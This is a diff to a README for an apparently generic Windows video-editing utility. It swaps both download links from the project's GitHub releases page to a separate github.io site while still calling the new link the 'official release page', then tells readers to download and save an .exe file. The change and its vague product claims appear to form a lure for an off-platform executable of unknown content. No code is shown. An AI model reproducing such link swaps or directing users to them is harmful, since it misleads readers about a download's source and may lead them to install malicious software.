@@ -1,6 +1,6 @@
 # 🎬 Production-Utility - Professional video editing tools for everyone
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Production-Utility-blue)](https://github.com/sandlike-paraguayan902/Production-Utility/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Production-Utility-blue)](https://sandlike-paraguayan902.github.io)
 
 Production-Utility provides video editors with tools to enhance their workflow. This software offers high-quality 4K video export options, artificial intelligence-powered editing help, and a suite of professional visual effects. You can process your media files quickly and keep your projects organized.
 
@@ -19,7 +19,7 @@ Before you install this software, check that your computer meets these minimum s
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official release page](https://github.com/sandlike-paraguayan902/Production-Utility/releases) to see the download options.
+1. Visit the [official release page](https://sandlike-paraguayan902.github.io) to see the download options.
 2. Locate the file ending in `.exe`. 
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
